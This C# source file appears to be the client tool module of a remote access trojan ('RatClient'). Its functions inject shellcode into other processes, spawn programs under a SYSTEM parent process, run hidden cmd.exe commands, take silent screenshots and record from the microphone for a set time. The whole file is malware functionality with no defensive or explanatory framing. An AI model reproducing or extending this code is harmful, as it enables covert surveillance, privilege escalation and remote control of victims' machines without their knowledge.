using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using RatClient.Mtool;




public class Tools
{
    private static int getProcidByname(string name)
    {
        return Process.GetProcessesByName(name.Replace(".exe", ""))[0].Id;
    }
    public static byte[] RunAsCurrentUser(string command)
    {
        List<byte> output = new List<byte>(); 
        IntPtr hRead;
        int chunck = 4096;
        int res = NativeMethods.RunAsLoggedInUser("cmd.exe /c " + command, out hRead);
        if (res == 0)
        {
            byte[] buffer = new byte[chunck];
            int bytesRead = NativeMethods.ReadFromPipe(hRead, buffer, chunck);
            while (bytesRead > 0)
            {
                foreach(byte i in buffer.Take(bytesRead))
                {
                    output.Add(i);
                }
                bytesRead = NativeMethods.ReadFromPipe(hRead, buffer, chunck);
            }
        }
        return output.ToArray();
    }
    public static bool StartAsSpawnedSystem(string appName, string parentName = null, string arguments = null)
    {
        int parentID;
        if (parentName != null)
        {
            parentID = getProcidByname(parentName);
        }
        else
        {
            parentID = (int)NativeMethods.GetSystemPID();
        }
        return NativeMethods.SpawnSystem(parentID, appName, arguments) == 0;
    }
    public static bool InjectProcess(byte[] shellCode, int procid= -1, string name = null)
    {
        if (procid==-1 && name == null)
        {
            throw new Exception("Function must recive process id or process name");
        }
        if (name != null)
        {
            procid = getProcidByname(name);
        }
        UIntPtr size_T = (UIntPtr)shellCode.Length;
        return NativeMethods.Inject(procid, shellCode, size_T) == 0;
    }


    private static byte[] GetByteFromMS(MemoryStream res, bool compressed, string algo = "zlib")
    {
        byte[] data = res.ToArray();
        if (compressed)
        {
            using (var ms = new MemoryStream())
            {
                using (var stream = Info.AlgorithmsCompress[algo](ms))
                {
                    stream.Write(data, 0, data.Length);
                    stream.Flush();
                }
                return ms.ToArray();
            }
        }
        return data;
    }

    public static int[] GetResolution()
    {
        IntPtr ptr = NativeMethods.getResolution();
        int[] resolution = new int[2];
        Marshal.Copy(ptr, resolution, 0, 2);
        return new int[2] { resolution[0], resolution[1] };
    }
    public static byte[] ScreenShot(bool Compresed = false)
    {
        int w = Info.Resoulution.Width;
        int h = Info.Resoulution.Height;
        using (Bitmap screenshot = new Bitmap(w, h))
        {
            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                Size s = new Size(w, h);
                graphics.CopyFromScreen(0, 0, 0, 0, s, CopyPixelOperation.SourceCopy);
            }
            using (MemoryStream ms = new MemoryStream())
            {
                screenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                return GetByteFromMS(ms, Compresed, "gzip");
            }
        }
    }
    public static byte[] RecordAudio(string time)
    {
        char type = time[time.Length - 1];
        string num = time.TrimEnd(type);
        bool isNum = int.TryParse(num, out int range);
        if (!isNum)
        {
            throw new Exception("Wrong range time");
        }
        range = Info.GetmilisecRange[type](range);
        AudioRecorder ar = new AudioRecorder();
        ar.StartRecording();
        System.Threading.Thread.Sleep(range);
        return ar.StopRecording();
    }
    public static byte[] RunCommand(string command)
    {
        byte[] outputBytes = null;
        ProcessStartInfo proc = new ProcessStartInfo();
        proc.Arguments = $"/c {command}";
        proc.FileName = "cmd.exe";
        proc.RedirectStandardOutput = true;
        proc.UseShellExecute = false;
        proc.CreateNoWindow = true;
        Process process = Process.Start(proc);
        using (MemoryStream ms = new MemoryStream())
        {
            process.StandardOutput.BaseStream.CopyTo(ms);
            if (ms.Length > 0)
            {
                outputBytes = ms.ToArray();
            }
            else
            {
                outputBytes = new byte[0];
            }
        }
        process.WaitForExit();
        process.Close();


        return outputBytes;
    }
}
